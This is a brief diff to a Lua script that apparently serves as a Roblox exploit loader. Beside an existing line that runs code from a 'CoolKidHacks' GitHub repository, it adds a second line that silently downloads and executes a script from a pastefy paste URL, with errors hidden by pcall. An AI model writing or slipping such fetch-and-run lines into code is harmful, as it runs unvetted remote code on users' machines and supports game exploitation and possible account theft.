@@ -48,6 +48,10 @@ end)
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/CoolKidHacks/Script/refs/heads/main/Orbit%20void"))()
 end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/qvaa6wIC/raw"))()
+end)
 -- =========================
 -- REMOTES
 -- =========================
